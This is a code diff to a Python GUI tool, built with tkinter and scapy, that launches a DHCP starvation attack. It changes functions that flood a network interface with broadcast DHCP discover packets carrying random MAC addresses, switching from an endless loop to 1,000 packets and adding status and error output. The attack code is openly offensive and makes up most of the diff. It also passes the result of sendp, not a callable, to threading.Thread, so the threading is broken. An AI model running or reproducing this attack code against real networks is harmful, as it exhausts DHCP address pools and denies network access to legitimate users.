@@ -17,7 +17,7 @@ from tkinter import *
 def startDhcp(interface, terminalContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
     global dhcpThreads, terminalLabel, errorOutputLabel
 
-    dhcpThreads = threading.Thread(target = lambda : dhcpStarvationHub(interface))
+    dhcpThreads = threading.Thread(target = lambda : startDhcpStarvation(interface))
 
     terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
     errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
@@ -53,13 +53,7 @@ def runDhcpAttack() :
     global dhcpThreads
     dhcpThreads.start()
 
-def dhcpStarvationHub(interface):
-    global macArray, ipArray
-    macArray = []
-    ipArray = []
-    start(interface)
-
-def start(interface):
+def startDhcpStarvation(interface):
     global sendPacketsThread
     
     dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
@@ -68,5 +62,9 @@ def start(interface):
                      /BOOTP(op=1,chaddr = RandMAC()) \
                      /DHCP(options=[('message-type','discover'),('end')])
     
-    sendPacketsThread = threading.Thread(sendp(dhcp_discover,iface=interface,loop=1,verbose=1))
-    sendPacketsThread.start()
+    terminalLabel["text"] += "$ Sending DHCP Packets...\n"
+    sendPacketsThread = threading.Thread(sendp(dhcp_discover,iface=interface,count=1000,verbose=1))
+    try :
+        sendPacketsThread.start()
+    except Exception as e :
+        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
